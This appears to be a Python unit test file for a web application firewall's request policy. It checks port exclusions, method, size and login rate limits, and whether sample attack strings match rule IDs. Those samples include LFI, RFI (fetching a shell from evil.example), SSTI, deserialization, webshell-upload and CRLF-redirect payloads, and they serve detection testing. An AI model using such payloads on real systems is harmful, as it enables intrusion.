import unittest
import sys
from pathlib import Path

AGENT_ROOT = Path(__file__).resolve().parents[1] / 'soc-agent'
sys.path.insert(0, str(AGENT_ROOT))
from core.waf import RequestPolicy, _scan_target, _EXCLUDE_PORTS


class WafPolicyTests(unittest.TestCase):
    def test_web_and_web_admin_ports_are_not_excluded_from_discovery(self):
        for port in (80, 443, 2375, 2376, 6443, 7001, 8443, 15672, 28017, 50070):
            with self.subTest(port=port):
                self.assertNotIn(port, _EXCLUDE_PORTS)

    def test_extended_attack_signatures(self):
        samples = {
            'WAF_LFI': 'file=php://filter/convert.base64-encode/resource=index.php',
            'WAF_RFI': 'page=https://evil.example/shell.php',
            'WAF_SSTI': '{{ config.__class__.mro() }}',
            'WAF_DESERIALIZE': 'payload=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==',
            'WAF_WEBSHELL': 'Content-Disposition: form-data; filename="shell.php"',
            'WAF_CRLF': 'next=%0d%0aLocation:%20https://evil.example',
        }
        for expected, payload in samples.items():
            with self.subTest(expected=expected):
                rule, _ = _scan_target(payload)
                self.assertIsNotNone(rule)
                self.assertEqual(rule['id'], expected)

    def test_method_body_and_login_rate_controls(self):
        policy = RequestPolicy({
            'waf_allowed_methods': ['GET', 'POST'],
            'waf_max_request_body_bytes': 1024,
            'waf_rate_limit_per_minute': 10,
            'waf_login_attempts_per_minute': 2,
        })
        self.assertEqual(policy.check('203.0.113.7', 'TRACE', '/', {}, 0)[0], 'WAF_METHOD')
        self.assertEqual(policy.check('203.0.113.7', 'POST', '/', {}, 2048)[0], 'WAF_SIZE')
        self.assertIsNone(policy.check('203.0.113.8', 'POST', '/login', {}, 10))
        self.assertIsNone(policy.check('203.0.113.8', 'POST', '/login', {}, 10))
        violation = policy.check('203.0.113.8', 'POST', '/login', {}, 10)
        self.assertEqual(violation[0], 'WAF_RATE')
        self.assertEqual(violation[-1], 429)


if __name__ == '__main__':
    unittest.main()
